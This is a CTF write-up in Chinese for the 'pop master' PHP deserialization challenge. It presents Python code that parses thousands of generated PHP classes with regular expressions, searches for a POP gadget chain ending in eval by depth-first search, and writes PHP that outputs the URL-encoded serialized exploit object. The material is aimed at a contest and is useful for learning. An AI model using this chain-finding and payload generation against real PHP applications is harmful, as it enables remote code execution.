pop master

0x00题目分析

题目需要让我们从10000个类中找pop链，而且入口点也给我们了：

<?php

//class.php.txt

class.php.txt中就是题目中要我们挖掘的类的代码。这么多类肯定不能手动找pop链了，但是粗略观察一下可以发现每个类都是大差不差的，就像下面那样：

0x02语法树分析

有大佬是用AST语法树对PHP代码进行解析，然后再分析各个节点，但是在做题的时候我不会这个方法。好在题目的代码类型比较单一，使用python正则表达式也能进行语法分析。

构造数据结果

首先得定义数据结构，这里是考虑到最终要通过function进行跳转，因此建立一个能描述函数特征的类，比如函数的名称、函数所在的类的名称、当前函数在图中的节点类型、能跳转到的下个节点的函数名称、函数的参数名称（为了判断参数是否被覆盖）等等，最终的描述函数特征的类如下：

class FunctionObj:
    def __init__(
            self,
            function_name: str = "", 
            is_blind_alley: bool = False, 
            next_fucntion: List[str] = None, 
            class_name: str = "", 
            argv_name: str = "", 
            is_tautology: int = -1
            ) -> None:
        self.function_name = function_name
        self.is_blind_alley = is_blind_alley
        self.next_fucntion = next_fucntion
        self.class_name = class_name
        self.argv_name = argv_name
        # 当前函数是否存在重言式, 如果存在其逻辑结果是如何
        # -1: 不存在重言式
        # 0: 存在, 逻辑结果为False
        # 1: 存在, 逻辑结果为True
        self.is_tautology = is_tautology


为了方便的通过函数名称查找函数对象，各个FunctionObj需要通过字典来进行索引，也就是最终要构建一个Dict[str, FunctionObj]的字典。

另外，为了能在最终生成构造pop链的php代码，还需要建立一个描述php类的特征的数据结构，比如去描述类的名称、成员变量、类中所含的函数对象，最终描述类特征的类如下：

class ClassObj:
    def __init__(
            self, 
            class_name: str = "", 
            attr_name: str = "", 
            function_list: List[FunctionObj] = None
            ) -> None:
        self.class_name = class_name
        self.attr_name = attr_name
        self.function_list = function_list


处理php代码中的类

我的思路是逐行读取代码，如果碰到了class关键字，则认为从该行开始是php的类了，然后定义一个函数parse_class开始处理php类。

def read_code(filename: str) -> Tuple[Dict[str, ClassObj], Dict[str, FunctionObj]]:
    funtion_dict = {}
    class_dict = {}
    with open(filename) as f:
        content = f.readlines()
    current_class = ""
    tmp_class_obj = ClassObj()
    for i in range(len(content)):
        # 是否是class类型
        if "class" in content[i]:
            tmp_class_obj, i = parse_class(content, i)
            # 建立关联表, 方便之后查询
            class_dict[tmp_class_obj.class_name] = tmp_class_obj
            for func in tmp_class_obj.function_list:
                funtion_dict[func.function_name] = func
    return class_dict, funtion_dict


在parse_class中，通过正则表达式匹配出类的名称与类的成员变量，并存储到数据结构ClassObj中。随后进行逐行读取，同时记录花括号的数量，即左右花括号数量是否平衡，若读到某一行左右花括号数量平衡，则说明这个类已经处理完了，可以进行返回。接下来判断当前行是否存在function关键字，以此来判断该行是否定义了函数，然后定义一个parse_function函数来处理php中的函数代码块：

def parse_class(content: List[str], idx: int) -> Tuple[ClassObj, int]:
    '''
    处理class
    '''
    # 记录花括号是否平衡, 判断类是否结束
    brace_cnt = 1
    class_obj = ClassObj()
    function_list = []
    class_regx = r'class (?P<class_name>([a-zA-Z0-9]*))\{'
    attr_regx = r'public (?P<attr_name>\$([a-zA-Z0-9]*));'

    # 首先获取类名
    res = re.search(class_regx, content[idx])
    if res:
        class_name = res.group("class_name")
        class_obj.class_name = class_name
    logger.info(f"parsing class {class_name}")
    # 处理
    while idx < len(content):
        idx += 1
        if '{' in content[idx]:
            brace_cnt += 1
        elif '}' in content[idx]:
            brace_cnt -= 1
        if brace_cnt == 0:
            break
        # 判断当前行是否定义了类的属性
        res = re.search(attr_regx, content[idx])
        if res:
            attr_name = res.group("attr_name")
            class_obj.attr_name = attr_name
            continue

        # 判断当前行是否为定义函数的行
        if 'function' in content[idx]:
            function_obj, idx = parse_function(content, idx, attr_name)
            function_obj.class_name = class_name
            function_list.append(function_obj)
            idx -= 1
            continue
    class_obj.function_list = function_list
    return class_obj, idx


在parse_function中，通过正则表达式匹配出函数的名称、参数名称，并通过FunctionObj数据结构进行存储。接着对代码块进行逐行遍历，和parse_class类似，也使用左右花括号的平衡与否确定函数代码块是否结束。遍历时，依次使用正则表达式进行如下的判断：

1.当前行是否为if形式的重言式
2.当前行是否为for形式的重言式
3.当前行是否存在无重言式或重言式为真的变量覆盖的情况，如果有则说明该节点为死胡同，并进行标记
4.当前行是否存在有效的函数跳转，如果有，则通过FunctionObj.next_function进行记录
5.当前行是否可以通过eval进行命令执行，如果可以则通过FunctionObj.next_function进行记录

具体的代码实现如下：

def parse_function(content: List[str], idx: int, attr_name: str) -> Tuple[FunctionObj, int]:
    '''
    处理类中的函数, 返回FunctionObj和当前处理完毕的下标值
    '''
    # 记录花括号是否平衡, 判断函数是否结束
    brace_cnt = 1
    function_obj = FunctionObj()
    next_function = []
    function_regx = r'public function (?P<function_name>([a-zA-Z0-9]*))\((?P<argv_name>\$([a-zA-Z0-9]*))\)\{'

    # 获取函数名称
    res = re.search(function_regx, content[idx])
    if res:
        function_name = res.group('function_name')
        argv_name = res.group('argv_name')
        function_obj.function_name = function_name
        function_obj.argv_name = argv_name
    if function_name == "iYAUWw":
        logger.debug(f"function name: {function_name}")
    while idx < len(content):
        idx += 1
        if '{' in content[idx]:
            brace_cnt += 1
        elif '}' in content[idx]:
            brace_cnt -= 1
        if brace_cnt == 0:
            break

        # 判断是否存在if永真或永假式
        if_regx = r'if\((?P<num1>[0-9]+)>(?P<num2>[0-9]+)\)\{'
        # 判断是否存在for形式的不可达代码
        for_regx = r'for\(\$i = 0; \$i < 0; \$i \+\+\)\{'
        res = re.search(if_regx, content[idx])
        if res:
            num1 = int(res.group('num1'))
            num2 = int(res.group('num2'))
            function_obj.is_tautology = 1 if num1 > num2 else 0
            continue

        res = re.search(for_regx, content[idx])
        if res and function_obj.is_tautology == -1:
            function_obj.is_tautology = 0

        # 判断函数参数是否被覆盖
        # 如果被覆盖, 意味着该函数不能成为pop链的一环
        # 如果变量覆盖的代码处于逻辑结果为假的重言式中, 则表明该代码不会被执行, 不能被算作变量覆盖
        blind_alley_regx = argv_name.replace('$', '\\$') + r'\s*=\s*(.*);'
        res = re.search(blind_alley_regx, content[idx])
        if res and not(function_obj.is_tautology == 0 and brace_cnt >= 2):
            function_obj.is_blind_alley = True
            continue

        # 判断是否存在函数跳转
        next_function_regx = r'\$this->' + attr_name.replace('$', '') + r'->(?P<function_name>[0-9a-zA-Z]*)\(' + argv_name.replace('$', '\\$') +'\);'
        res = re.search(next_function_regx, content[idx])
        if res:
            next_function.append(res.group('function_name'))
            function_obj.next_fucntion = next_function
            continue

        # 判断是否可以通过eval命令执行
        eval_regx = r'eval\(' + argv_name.replace('$', '\\$') + r'\);'
        res = re.search(eval_regx, content[idx])
        if res:
            function_obj.next_fucntion = ['eval']
            continue
    return function_obj, idx


当全部处理完成后，即可将函数数据结构function_obj和当前处理的代码行数进行返回

0x03搜索pop链

深度优先搜索

当全部处理完成后，我们会得到一个Dict[str, FunctionObj]的字典，这个字典其实就是描述一个图的邻接矩阵，key为当前节点的名称，value为这个节点的临接属性，我们通过起点开始搜索这张图，如果搜索到了eval节点即找到了一条路径，也就是一条合法的pop链。

这里我使用了dfs进行搜索，使用bfs也是可以的。

vis_func = {}
def dfs(function_obj: FunctionObj, function_obj_list: Dict[str, FunctionObj]):
    # 遍历到了重复的function
    if function_obj.function_name in vis_func:
        return None
    # 这个function无法进行跳转
    if function_obj.is_blind_alley == True:
        return None
    # 到达终点
    if "eval" in function_obj.next_fucntion:
        return [function_obj]

    for i in function_obj.next_fucntion:
        res: List[FunctionObj] = dfs(function_obj_list[i], function_obj_list)
        vis_func[i] = 1
        if res != None:
            return [function_obj] + res

def create_pop_code(pop_chain: List[FunctionObj], class_obj: Dict[str, ClassObj]):
    f = open('code.php', 'w')
    f.write('<?php\n')
    for i in range(0, len(pop_chain)-1):
        obj = pop_chain[i]
        f.write(f'class {obj.class_name}{{\n')
        f.write(f'{" "*4}public {class_obj[obj.class_name].attr_name};\n')
        f.write(f"{' '*4}public function __construct(){{\n")
        f.write(f"{' '*8}$this->{class_obj[obj.class_name].attr_name.replace('$', '')} = new {pop_chain[i+1].class_name}();\n}}\n")
        f.write(f'}}\n')
    f.write(f"class {pop_chain[-1].class_name}{{\n")
    f.write(f'{" "*4}public {class_obj[pop_chain[-1].class_name].attr_name};\n')
    f.write(f'}}\n')

    code = f'$obj = new {pop_chain[0].class_name}();\n$ser_obj = serialize($obj);\necho urlencode($ser_obj);\n'
    f.write(code)
    f.write('?>')
    f.close()
